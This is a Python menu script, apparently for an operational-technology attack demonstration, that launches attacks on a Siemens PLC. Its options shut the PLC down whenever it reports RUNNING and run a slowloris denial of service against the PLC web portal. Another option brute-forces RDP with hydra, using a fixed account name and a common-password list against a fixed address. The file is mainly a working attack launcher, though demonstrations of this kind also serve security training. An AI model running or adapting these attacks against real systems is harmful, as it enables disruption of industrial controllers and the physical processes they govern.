import os

while True:
    print("Welcome to the OT-Demo selection menu, here are the available options:")
    print("[1]: Send a HTTP-POST request to the Siemens portal")
    print("[2]: Run the Scanning script with added functionality to always turn the PLC off when its status is ""RUNNING""")
    print("[3]: Run the Automated scanning script with added functionality to always turn the PLC off when its status is ""RUNNING"", this does not require user input")
    print("[4]: DOS the PLC webportal")
    print("[5]: Bruteforce the PLC RDP login with common passwords (WSL/LINUX REQUIRED. HYDRA MUST BE INSTALLED ON WSL/LINUX)")
    print("[6]: Run the scanning script with the added functionality to automatically flip the power state of the PLC (WIP)")
    print("--------------------------------------------------")
    print("[A]: Install hydra on WSL (WSL INSTALLED AND CONFIGURED REQUIRED)")
    print("[B]: Install requirements.txt")
    print("--------------------------------------------------")
    user_input = input("Please enter your choice: ").lower()
    if user_input not in ["1", "2", "3", "4", "5", "6", "a", "b"]:
        print("Invalid input, please try again")
    
    elif user_input == "1":
        import scripts.PostScript
    
    elif user_input == "2":
        import scripts.AlwaysOffScript

    elif user_input == "3":
        import scripts.AutomatedAlwaysOffScript

    elif user_input == "4":
        os.system("py scripts/slowloris.py 192.168.0.1")

    elif user_input == "5":
        import os
        path = os.path.abspath(os.getcwd())
        forward_slash_path = path.replace("\\", "/")
        formatted_path = forward_slash_path.replace("C:/", "/mnt/c/")
        os.system(f'wsl hydra -t 1 -V -f -l engadm -P "{formatted_path}/scripts/commonpasswords/500-worst-passwords.txt" rdp://192.168.0.199')
    
    elif user_input == "6":
        print("WIP")

    elif user_input == "a":
        print("Installing hydra on WSL, please wait...")
        os.system("wsl sudo apt install hydra")
        print("Hydra installed successfully, it is ready for use.")

    elif user_input == "b":
        print("Installing requirements.txt, please wait...")
        os.system("pip install -r requirements.txt")
        print("Requirements installed successfully, you are ready to go.")

    else:
        print("error LOL")